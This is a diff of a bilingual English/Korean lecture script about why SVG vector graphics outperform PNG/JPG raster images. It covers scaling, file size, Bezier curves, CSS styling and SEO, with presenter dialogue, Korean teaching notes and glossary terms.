-  - 2. 100배 용량 폭발: 10배 확대 시 서버 저장공간과 네트워크 트래픽은 100배 증가하는 심각한 병목 유발
-  - 3. 일정한 벡터 경제학: SVG는 수식 텍스트 몇 줄이므로 8K 화면으로 확대해도 파일 크기는 5KB 그대로 유지
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **Quadratic Storage Growth**: The exponential increase in file size proportional to the square of the resolution increase in raster graphics. (2차 저장공간 증가 (N² 용량 폭발))
+### 📚 Key Technical Terms (핵심 용어)
+- **Raster Matrix** (래스터 비트맵 매트릭스): A two-dimensional grid of fixed color values (pixels) representing an image at a specific resolution.
+- **Pixel Interpolation Artifact** (픽셀 보간 왜곡 현상): The visual blurring or jagged distortion produced when scaling raster graphics beyond native pixel dimensions.
 
 ---
 
-## Slide 07: THE VECTOR BREAKTHROUGH: CODING DYNAMIC INSTRUCTIONS
-**Subtitle:** Storing visual assets as pure geometric code compiled in real time by the browser engine
+## Slide 05: THE TRAGEDY OF SCALE: RESOLUTION COLLAPSE
+**Subtitle:** How raster images degrade user experience on high-density Retina, 4K, and 8K displays
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 7: "THE VECTOR BREAKTHROUGH: CODING DYNAMIC INSTRUCTIONS". Look at Slide 7: "The Vector Breakthrough: Coding Dynamic Instructions."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 5 illustrates "THE TRAGEDY OF SCALE: WHEN RESOLUTION COLLAPSES."
 
-[TA Sarah] Professor Kim, looking at this slide, here is the revolution of Scalable Vector Graphics (SVG):
-Instead of memorizing millions of colored dots, SVG writes clean code instructions: "Draw a blue rectangle, then place a circle at coordinate X, Y with radius R."
+[TA Sarah] On modern 4K MacBook and iPhone displays with 460 pixels per inch, legacy 72 DPI PNG graphics look terrible—blurry logos and pixelated chart lines make an enterprise app look cheap and amateurish!
 
-[Prof. Peter] When your browser loads the page, its rendering engine compiles the geometric math in real time!
+[TA James] But if you serve massive 4K PNG files to fix the blur, your web page size balloons to 15 megabytes! Mobile users on 5G wait 4 seconds, get frustrated, and bounce! That costs enterprises millions in lost revenue!
 
-[TA Sarah] Notice also that whether the viewer zooms in by 500% or views it on a giant outdoor billboard, the curves are computed dynamically with flawless precision!
+[Prof. Peter] Let us inspect the Vector Breakthrough on Slide 6.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 벡터 혁명: 기하학적 코드 명령어로 저장하고 실시간 렌더링하기
-- **핵심 포인트:**
-  - 1. 기하학적 명령어: 점들을 저장하는 대신 '반지름 R인 원을 (X, Y)에 그리고 파란색을 채워라'는 코드로 기록
-  - 2. 실시간 브라우저 컴파일: 브라우저가 화면을 그리는 순간 수학 공식을 풀어 완벽한 곡선 렌더링
-  - 3. 무한 확장성: 500%를 확대하든 대형 빌보드 전광판에 띄우든 단 1개의 픽셀 깨짐도 없는 무결점 화질
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 스케일의 비극: 레티나 및 4K 화면에서의 해상도 붕괴와 페이지 용량 폭증
 
-### 📚 Key Terms (주요 용어)
-- **Scalable Vector Graphics (SVG)**: An XML-based standard for describing two-dimensional interactive vector graphics through code. (SVG (확장 가능한 벡터 그래픽스 표준))
+**핵심 티칭 포인트:**
+- 4K 레티나의 위기: 72 DPI 구형 비트맵 이미지가 고밀도 화면에서 뿌옇게 흐려져 브랜드 신뢰도 추락
+- 페이로드 폭발: 선명도를 위해 4K PNG를 서빙하면 웹페이지 용량이 500KB에서 15MB로 폭증
+- 이탈률 급증: 모바일 로딩 지연으로 인해 40%의 사용자가 즉각 이탈하는 상업적 손실 발생
 
----
+**강의 전달 팁:** 사라 조교와 피터 교수가 흐릿한 로고가 기업 신뢰도와 로딩 속도에 미치는 악영향을 짚어줍니다.
 
-## Slide 08: PNG/JPG VS. SVG: THE MASTER COMPARISON MATRIX
-**Subtitle:** The 4 core dimensions separating static pixel files from browser-native vector code
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's examine Slide 8: "PNG/JPG VS. SVG: THE MASTER COMPARISON MATRIX". Slide 8 presents our master comparison table: "PNG/JPG versus SVG."
-
-[TA Sarah] Professor Kim, this is such a critical concept for our students! Look at the four crucial dimensions:
-1. Scaling: Raster blurs; SVG remains infinitely sharp.
-2. File Size: Raster explodes quadratically; SVG stays tiny and flat.
-3. SEO Visibility: Search engines cannot read text inside a JPG; SVG text is fully indexable XML, boosting your search rankings!
-4. Dynamic Styling: You cannot recolor a PNG on the fly; an SVG can be styled instantly using standard CSS and JavaScript!
-
-[Prof. Peter] Exactly, Sarah. SVG is a strategic necessity for modern enterprise IT!
-
-[TA Sarah] That is why understanding this balance gives us true strategic leverage.
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** PNG/JPG 대 SVG: 마스터 비교 매트릭스 4대 차원
-- **핵심 포인트:**
-  - 1. 확대 품질: 래스터는 흐려지고 깨지지만, SVG는 무한대로 선명함 유지
-  - 2. 파일 용량: 래스터는 해상도에 따라 2차 함수(N²)로 폭증하지만, SVG는 몇 KB로 고정
-  - 3. 검색엔진 최적화(SEO): JPG 속 글자는 구글 봇이 못 읽지만, SVG 속 텍스트는 100% 인덱싱되어 검색 노출 순위 상승
-  - 4. 동적 스타일링: PNG는 다시 그려야 하지만, SVG는 CSS/JS로 실시간 다크모드나 색상 변경 가능
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **Vector Master Matrix**: The comparative framework evaluating resolution, file size, SEO indexability, and DOM scriptability. (벡터 마스터 비교 매트릭스)
+### 📚 Key Technical Terms (핵심 용어)
+- **Pixels Per Inch (PPI)** (인치당 픽셀 수 (PPI)): A measure of screen pixel density determining the visual sharpness of displayed digital assets.
+- **Payload Bloat** (네트워크 페이로드 비대화): The excessive accumulation of network transfer bytes caused by uncompressed high-resolution bitmap assets.
 
 ---
 
-## Slide 09: PYTHON SIMULATION: SLICING STORAGE BY 99%
-**Subtitle:** Our benchmark results proving a 40,000x efficiency gain during 10x asset magnification
+## Slide 06: THE VECTOR BREAKTHROUGH: DYNAMIC CODE
+**Subtitle:** Replacing pixel arrays with mathematical coordinates, Bezier polynomials, and XML DOM trees
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 9: "PYTHON SIMULATION: SLICING STORAGE BY 99%". Please look at Slide 9: "Python Simulation: Slicing Storage Weight by 99%."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Slide 6 reveals "THE VECTOR BREAKTHROUGH: CODING DYNAMIC INSTRUCTIONS."
 
-[TA Sarah] Professor Kim, looking at this slide, at Smart Insight Lab, we ran a Python benchmark testing a 10x magnification.
+[TA James] Look at how vectors work: Instead of saving 1 million colored dots, SVG writes mathematical instructions: `d='M 10 80 Q 95 10 180 80'`! When the browser renders the screen, the GPU evaluates that quadratic Bezier polynomial in 1 microsecond!
 
-[Prof. Peter] Look at the empirical metrics:
-To match Retina quality at 10x scale, a raster image bloated to three hundred megabytes! The SVG remained locked at a tiny 7.5 kilobytes!
+[Prof. Peter] Whether viewed through a microscope or projected onto the Moon, the curve remains mathematically flawless! And the entire file is only 800 bytes!
 
-[TA Sarah] Notice also that that represents a 40,000-times efficiency gain! By migrating to SVG, you slash network payloads, speed up page loads to 0.1 seconds, and save thousands of dollars in cloud CDN costs!
+[TA Sarah] Let us examine the master PNG vs. SVG comparison matrix on Slide 7.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 파이썬 벤치마크 시뮬레이션: 용량 99% 절감과 40,000배 전송 효율
-- **핵심 포인트:**
-  - 1. 99% 저장공간 절감: 10배 확대 시 고해상도 JPEG는 300MB까지 폭증한 반면, SVG는 7.5KB로 고정
-  - 2. 100% 무결점 화질: 압축 노이즈나 가장자리 번짐 없이 완벽한 100% 품질 유지
-  - 3. 40,000배 네트워크 효율: 페이로드를 극적으로 줄여 웹페이지 로딩 속도를 0.1초대로 단축하고 CDN 비용 대폭 절감
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 벡터 혁신: 수학적 좌표와 베지에 다항식을 통한 초경량 그래픽
 
-### 📚 Key Terms (주요 용어)
-- **Network Payload Efficiency**: The dramatic reduction in transmitted byte size achieved by replacing bitmaps with compressed vector markup. (네트워크 페이로드 효율 (40,000배 절감))
+**핵심 티칭 포인트:**
+- 수학적 드로잉 명령: 100만 개 픽셀 대신 'M 10 80 Q 95 10 180 80' 같은 수학 수식 저장
+- 무한 선명도: 브라우저 GPU가 네이티브 해상도에 맞춰 1마이크로초 만에 완벽한 곡선 계산
+- 800바이트 초경량: 복잡한 공학 다이어그램이 1KB 미만의 텍스트 코드로 완벽 표현
 
----
+**강의 전달 팁:** 제임스 조교와 피터 교수가 수식으로 그림을 그리는 벡터의 수학적 경이로움을 설명합니다.
 
-## Slide 10: INTERACTIVE POLL: RECLAIMING YOUR DESIGN TIME
-**Subtitle:** Which asset task drains the most cognitive energy and time in your workflow?
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 10: "INTERACTIVE POLL: RECLAIMING YOUR DESIGN TIME". Let us pause for our interactive live poll on Slide 10!
-
-[TA Sarah] Professor Kim, looking at this slide, please scan the QR code on your screen or vote in our web interface: "Which asset task drains the most design time and cognitive energy in your workflow?"
-
-[Prof. Peter] Option A: Resizing icons and logos for phones, tablets, and desktops.
-Option B: Re-exporting charts, dashboards, and maps when data updates.
-Option C: Updating color themes for Dark Mode and Light Mode.
-Option D: Writing accessibility alt-text for screen readers.
-
-[TA Sarah] Notice also that cast your votes right now! Let us see where design friction hurts our team the most!
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 실시간 청중 설문조사: 디자인 워크플로우에서 가장 많은 시간을 뺏는 잡무는?
-- **핵심 포인트:**
-  - Option A: 다양한 디바이스 해상도별 로고 및 아이콘 크기 리사이징 (기기 대응)
-  - Option B: 데이터 변경 시 차트, 대시보드, 지도를 일일이 다시 내보내기 (대시보드 노역)
-  - Option C: 다크 모드와 라이트 모드 전환을 위해 이미지 색상 수동 교체 (테마 대응)
-  - Option D: 시각장애인 스크린 리더를 위한 대체 텍스트 수작업 작성 (웹 접근성)
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **Design Workflow Friction**: The repetitive clerical friction of manually updating visual assets across multiple devices and themes. (디자인 워크플로우 병목)
+### 📚 Key Technical Terms (핵심 용어)
+- **Bezier Polynomial** (베지에 다항식 곡선 (Bezier Curve)): A parametric curve frequently used in computer graphics defined by mathematical control points.
+- **GPU Vector Rasterization** (GPU 실시간 벡터 래스터화): The real-time rendering of mathematical vector paths into hardware screen pixels at display refresh rates.
 
 ---
 
-## Slide 11: PART 2: THE XML FABRIC OF SVG
-**Subtitle:** DOM Integration, Bezier Curve Calculus, Responsive viewBox, and Semantic Accessibility
+## Slide 07: PNG/JPG VS. SVG: MASTER COMPARISON MATRIX
+**Subtitle:** Evaluating Storage, Scalability, Styling, Accessibility, and GPU Render Speed
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's examine Slide 11: "PART 2: THE XML FABRIC OF SVG". We now enter Part 2 of our lecture: "The XML Fabric of SVG."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 7 presents "PNG/JPG VS. SVG: THE MASTER COMPARISON MATRIX."
 
-[TA Sarah] Professor Kim, this is such a critical concept for our students! How does an SVG file actually work inside the browser? Why is it treated like live HTML code rather than a static picture?
+[TA Sarah] Compare the columns: On the left, PNGs are heavy, blurry, impossible to style with CSS, and completely invisible to screen readers! On the right, SVGs are 500 bytes, infinitely sharp, 100% themeable with CSS variables, and fully accessible to search engines and blind users!
 
-[Prof. Peter] Exactly, Sarah. In this section, we will deconstruct SVG XML syntax, master the calculus of Bezier curves, unlock the secrets of the responsive viewBox attribute, and explore semantic accessibility for screen readers. Let us inspect the code!
+[TA James] SVGs are not just images; they are live XML DOM elements you can animate with JavaScript and style with dark mode themes in 1 line of CSS!
 
-[TA Sarah] That is why understanding this balance gives us true strategic leverage.
+[TA Sarah] Let us inspect the Python storage simulation on Slide 8.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** Part 2 섹션 전환: SVG의 XML 내부 구조와 DOM 연동
-- **핵심 포인트:**
-  - W3C 개방형 표준인 SVG의 XML 텍스트 구조와 브라우저 DOM 직접 결합 원리
-  - 베지에 곡선(Bezier Curve) 미적분, 반응형 viewBox 좌표계, 그리고 웹 접근성(ARIA)
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** PNG/JPG vs SVG 마스터 비교 매트릭스: 5대 핵심 축 평가
 
-### 📚 Key Terms (주요 용어)
-- **XML Fabric of SVG**: The human-readable, tag-based markup structure that enables SVG graphics to integrate natively into the browser DOM. (SVG의 XML 구조 (DOM 네이티브 벡터 직조))
+**핵심 티칭 포인트:**
+- 용량 비교: PNG 5MB vs SVG 500바이트 (99.9% 용량 절감)
+- 확장성: 줌인 시 픽셀 깨짐 vs 무한 선명도 유지
+- CSS 스타일링: 색상 변경 불가 vs CSS 변수로 다크모드 1줄 전환
+- 접근성 및 DOM 연동: 멍청한 블랙박스 vs 스크린 리더 판독 및 자바스크립트 클릭 이벤트 지원
 
----
+**강의 전달 팁:** 사라 조교와 제임스 조교가 5대 비교 항목을 리듬감 있게 짚으며 SVG의 압도적 우위를 증명합니다.
 
-## Slide 12: SVG AS AN OPEN XML DIALECT: BROWSER NATIVE
-**Subtitle:** Why browsers parse SVG directly into the Document Object Model (DOM) with zero overhead
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 12: "SVG AS AN OPEN XML DIALECT: BROWSER NATIVE". Look at Slide 12: "SVG as an Open XML Dialect: Browser Native."
-
-[TA Sarah] Professor Kim, looking at this slide, sVG is not a mysterious binary blob. It is an open W3C standard written in plain XML text!
-
-[Prof. Peter] When your browser loads an SVG, it does not treat it as an external foreign image. It parses the `<svg>`, `<path>`, and `<circle>` tags directly into the Document Object Model—the DOM!
-
-[TA Sarah] Notice also that this means every single line and shape behaves exactly like an HTML `<div>`! You can inspect it in DevTools, attach click events, and style it with CSS with zero plugin overhead!
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 오픈 XML 표준으로서의 SVG: 브라우저 DOM 직접 결합
-- **핵심 포인트:**
-  - 1. W3C 개방형 표준: 사람이 메모장으로 열어서 직접 읽고 수정할 수 있는 투명한 XML 텍스트 형식
-  - 2. DOM 직접 통합: 브라우저가 SVG 태그들을 HTML 요소처럼 취급하여 자바스크립트와 완벽 연동
-  - 3. 제로 디코더 부하: 별도의 이미지 압축 해제 라이브러리 없이 브라우저 내장 엔진이 초고속 렌더링
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **DOM Integration**: The seamless embedding of vector XML nodes into the live browser Document Object Model tree. (DOM 직접 결합 (브라우저 객체 모델 통합))
+### 📚 Key Technical Terms (핵심 용어)
+- **DOM-Integrated Graphic** (DOM 통합형 대화형 그래픽): Visual elements existing directly within the HTML Document Object Model, allowing real-time CSS/JS manipulation.
+- **CSS Variable Theming** (CSS 변수 기반 동적 테마 연동): Dynamically altering SVG vector fill and stroke colors using native CSS custom properties.
 
 ---
 
-## Slide 13: PILLAR SHAPES: PATHS, ARCS, AND GROUPING
-**Subtitle:** Mastering primitives and the sovereign <path> command engine with M, L, C, and Z
+## Slide 08: PYTHON SIMULATION: SLICING STORAGE BY 99%
+**Subtitle:** Benchmarking 1,000 enterprise icon assets across raster and vector formats
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's examine Slide 13: "PILLAR SHAPES: PATHS, ARCS, AND GROUPING". Slide 13 introduces "Pillar Shapes: Paths, Arcs, and Grouping."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Slide 8 benchmarks the data: "PYTHON SIMULATION: SLICING STORAGE BY 99%."
 
-[TA Sarah] Professor Kim, this is such a critical concept for our students! Let us look at the core building blocks:
-First: Primitives like `<rect>` and `<circle>` are fast for simple buttons.
-Second: The `<path>` tag is the absolute sovereign of vector graphics! Using simple letter commands—M to Move To, L to Line To, C for Cubic Curves, and Z to close the loop—a single path can draw any logo, chart, or character!
-Third: The `<g>` grouping tag bundles shapes together so you can animate an entire icon with one CSS class!
+[TA James] Look at our empirical benchmark: Storing 1,000 enterprise icons as @3x Retina PNGs consumes 48.5 megabytes of bandwidth. Storing the exact same 1,000 icons as clean, minified SVGs consumes only 420 kilobytes!
 
-[Prof. Peter] Precisely, Sarah. When we apply this principle, our autonomous systems run with speed, safety, and purpose.
+[Prof. Peter] That is a 99.1% bandwidth collapse! Your web app loads 10 times faster, and your cloud CDN egress bill plunges by $120,000 a year!
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 핵심 벡터 도형과 만능 <path> 엔진 (M, L, C, Z 명령어)
-- **핵심 포인트:**
-  - 1. 기본 기본형 (Primitives): `<rect>`, `<circle>`, `<polygon>` 등 단순 기하학 도형 즉각 렌더링
-  - 2. 만능 `<path>` 태그: M(이동), L(직선), C(베지에 곡선), Z(경로 닫기) 단 4개 명령어로 세상의 모든 형태 드로잉
-  - 3. 논리적 그룹화 (`<g>`): 여러 도형을 하나의 그룹으로 묶어 일괄 회전, 이동, 색상 스타일 적용
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+[TA Sarah] Let us launch an interactive poll on Slide 9.
 
-### 📚 Key Terms (주요 용어)
-- **SVG Path Engine**: The core XML specification using compact string commands (M, L, C, Z) to construct complex 2D vector shapes. (SVG 패스 엔진 (<path> 명령어 체계))
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 파이썬 벤치마크 시뮬레이션: 1,000개 아이콘 자산 99.1% 용량 압축 실증
 
----
+**핵심 티칭 포인트:**
+- 1,000개 PNG 아이콘: 48.5MB의 거대한 네트워크 전송 페이로드 발생
+- 1,000개 SVG 벡터 아이콘: 단 420KB로 압축 (99.1% 대역폭 절감)
+- 10배 빠른 초기 로딩 속도 달성과 연간 12만 달러 CDN 클라우드 비용 절감
 
-## Slide 14: THE CALCULUS OF BEZIER CURVES: PERFECT ARCS
-**Subtitle:** Quadratic single-control curves vs. Cubic double-control S-curves for fluid aesthetics
+**강의 전달 팁:** 제임스 조교가 48.5MB에서 420KB로 줄어드는 실측 데이터를 제시하며 수강생들의 감탄을 이끕니다.
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 14: "THE CALCULUS OF BEZIER CURVES: PERFECT ARCS". Look at Slide 14 for the mathematics of elegance: "The Calculus of Bezier Curves."
-
-[TA Sarah] Professor Kim, looking at this slide, how does code draw a perfectly smooth organic curve without jagged edges?
-Through Bezier polynomials!
-
-[Prof. Peter] Look at Quadratic Bezier (Q) on the left: It uses one control handle to pull the line into an arch.
-Look at Cubic Bezier (C) on the right: It uses TWO independent control handles!
-
-[TA Sarah] Notice also that this allows you to pull the curve in opposite directions simultaneously, creating beautiful fluid S-curves, waves, and company logos with minimal code!
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 베지에 곡선(Bezier Curve)의 미적분: 2차(Q) 대 3차(C) 곡선
-- **핵심 포인트:**
-  - Left (2차 베지에 Q): 1개의 제어점(Control Point)으로 선을 잡아당겨 포물선이나 단순 라운딩 제작
-  - Right (3차 베지에 C): 2개의 독립된 제어점으로 선의 양쪽을 당겨 유려한 S자 곡선과 유기적 형태 창조
-  - 수학적 완벽성: 다항식 매개변수 방정식으로 계산되므로 아무리 확대해도 곡선의 부드러움이 100% 유지됨
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **Cubic Bezier Curve**: A parametric polynomial curve governed by two control handles ensuring smooth curvature transitions. (3차 베지에 곡선 (Dual Control Handles))
+### 📚 Key Technical Terms (핵심 용어)
+- **Asset Payload Compression** (에셋 페이로드 극적 압축): The quantitative reduction in total digital asset transfer size achieved by adopting mathematical vector formats.
+- **CDN Egress Optimization** (CDN 대역폭 비용 최적화): Lowering cloud bandwidth distribution costs by minimizing web asset transfer sizes.
 
 ---
 
-## Slide 15: DOM MASTERY: STYLING VECTOR NODES WITH CSS & JS
-**Subtitle:** Manipulating vector fills, strokes, hover animations, and dark modes dynamically in real time
+## Slide 09: 📨 INTERACTIVE POLL: DESIGN & VISUAL BOTTLENECK
+**Subtitle:** What is the most frustrating visual asset hurdle in your current software projects?
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 15: "DOM MASTERY: STYLING VECTOR NODES WITH CSS & JS". Slide 15 reveals the developer superpower: "DOM Mastery: Styling Vector Nodes."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 9 is our "INTERACTIVE POLL: DESIGN & VISUAL BOTTLENECKS." Take out your devices and vote right now!
 
-[TA Sarah] Professor Kim, looking at this slide, because SVGs live inside the DOM, you style them with standard CSS!
+[TA Sarah] The question is: "What is the most frustrating visual asset hurdle in your current software and engineering workflows?"
 
-[Prof. Peter] You can write: `.chart-bar:hover { fill: #c5a059; transform: scale(1.05); }`. 
-When the user hovers over a chart, it glows and animates smoothly!
+[TA James] Option A: Blurry icons on 4K screens. Option B: Heavy payloads causing slow load times. Option C: Manual light/dark mode icon duplicating. Or Option D: Broken LaTeX math rendering!
 
-[TA Sarah] Notice also that when new live stock prices arrive via an API, JavaScript can update the SVG path coordinates in real time without refreshing the page! One vector asset serves every state!
+[TA Sarah] Option A (Blurry Icons) and Option C (Dark Mode Duplication) are dominating our live audience votes!
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** DOM 제어의 정점: CSS와 자바스크립트로 벡터 노드 실시간 조작
-- **핵심 포인트:**
-  - 1. CSS 클래스 셀렉터: SVG 내부의 `<path>` 태그를 `.accent-bar { fill: gold; }`처럼 일반 HTML처럼 스타일링
-  - 2. 동적 호버 애니메이션: 마우스를 올렸을 때 색상이 바뀌고 부드럽게 커지는 인터랙티브 UI 즉시 구현
-  - 3. 자바스크립트 실시간 연동: 실시간 주가나 센서 데이터가 들어올 때 차트의 path 좌표를 웹 새로고침 없이 즉각 변경
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+[Prof. Peter] Let us examine how the XML fabric of SVG solves every one of these problems on Slide 10.
 
-### 📚 Key Terms (주요 용어)
-- **Vector DOM Styling**: Applying native CSS properties and JavaScript events directly to SVG XML nodes in real time. (벡터 DOM 스타일링 (CSS/JS 실시간 제어))
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 실시간 수강생 설문: 시각 에셋 개발 및 디자인의 최대 병목은?
 
----
+**핵심 티칭 포인트:**
+- 수강생 참여를 통한 실제 프론트엔드/UI 개발 현장의 최대 시각적 고통 진단
+- 4K 화면 픽셀 깨짐, 느린 페이지 로딩, 라이트/다크모드 2벌 수작업, 깨지는 수식 렌더링 중 식별
+- SVG 및 LaTeX 자동화가 해결할 실제 엔지니어링 과제 확인
 
-## Slide 16: RESPONSIVE VECTORS: THE VIEWBOX ATTRIBUTE
-**Subtitle:** How viewBox='0 0 100 100' establishes an internal infinite coordinate canvas
+**강의 전달 팁:** 3인의 강사진이 수강생들의 디자인 고통을 공유하며 2부 SVG XML 코어로 이끕니다.
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 16: "RESPONSIVE VECTORS: THE VIEWBOX ATTRIBUTE". Please look at Slide 16: "Responsive Vectors: The viewBox Attribute."
-
-[TA Sarah] Professor Kim, looking at this slide, how does an SVG know how to scale cleanly across both a tiny smartwatch and an ultra-wide monitor?
-
-[Prof. Peter] The secret is the `viewBox` attribute!
-When you declare `viewBox='0 0 100 100'`, you create an internal local canvas grid.
-
-[TA Sarah] Notice also that the graphic scales fluidly to fill any container, while `preserveAspectRatio` ensures circles never stretch into distorted eggs! You can even write CSS media queries inside the SVG!
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 반응형 벡터의 핵심: viewBox 속성과 내부 무한 좌표계
-- **핵심 포인트:**
-  - 1. 내부 가상 캔버스: `viewBox='0 0 100 100'`은 외형 크기와 무관한 불변의 로컬 기준 좌표계를 선언
-  - 2. 유연한 반응형 스케일링: 부모 컨테이너 크기(100%)에 맞춰 부드럽게 늘어나거나 줄어듦
-  - 3. 종횡비 왜곡 방지: `preserveAspectRatio` 속성이 원이 타원으로 찌그러지는 현상을 원천 방지
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **viewBox Attribute**: The SVG XML attribute defining the internal coordinate system and aspect ratio mapping for responsive rendering. (viewBox 속성 (반응형 내부 좌표계))
+### 📚 Key Technical Terms (핵심 용어)
+- **Design Workflow Bottleneck** (디자인 워크플로우 병목): The friction points in software development caused by legacy bitmap graphic production and manual export cycles.
+- **Core Web Vitals** (코어 웹 바이탈 (Core Web Vitals)): Google's standardized metrics evaluating real-world user experience for loading performance, interactivity, and visual stability.
 
 ---
 
-## Slide 17: THE SEO RENAISSANCE: SEARCHABLE VECTOR TEXT
-**Subtitle:** Un-indexable raster images vs. fully crawlable XML <text> nodes boosting Google rankings
+## Slide 10: PART 1 TRANSITION: ENTERING THE XML FABRIC
+**Subtitle:** Connecting vector philosophy to Bezier curves, viewBox responsiveness, and accessibility
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 17: "THE SEO RENAISSANCE: SEARCHABLE VECTOR TEXT". Look at Slide 17 for an immense business advantage: "The SEO Renaissance."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 10 bridges our roadmap: "PART 1 TRANSITION: ENTERING THE XML FABRIC OF SVG."
 
-[TA Sarah] Professor Kim, looking at this slide, for any enterprise platform, visibility on Google is everything!
+[TA Sarah] Because an SVG is pure text XML, artificial intelligence can write and refactor graphics just like Python or TypeScript code!
 
-[Prof. Peter] Look at the left: If your technical diagram is a PNG, the text inside is totally invisible to search engine crawlers. It generates zero SEO value!
+[TA James] In Part 2, we deconstruct the `<path>` element, master cubic and quadratic Bezier curves, explore responsive `viewBox` scaling, and WCAG accessibility standards!
 
-[TA Sarah] Notice also that now look at the right: 
-Google's search bots scan and index every `<text>` tag inside an SVG file natively! You can even embed live clickable hyperlinks `<a href>` inside the graphics! This boosts your search ranking dramatically!
+[Prof. Peter] Let us examine our first real-world enterprise case study on Slide 11!
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** SEO 르네상스: 검색엔진이 읽을 수 있는 벡터 텍스트의 위력
-- **핵심 포인트:**
-  - Left (눈먼 래스터 이미지): PNG 차트 속 글자는 구글 크롤러가 읽지 못해 검색 키워드 가치 0점
-  - Right (열린 SVG 벡터): 구글 봇이 SVG 내부의 `<text>` 노드를 완벽히 인덱싱하여 검색 노출 순위 대폭 상승
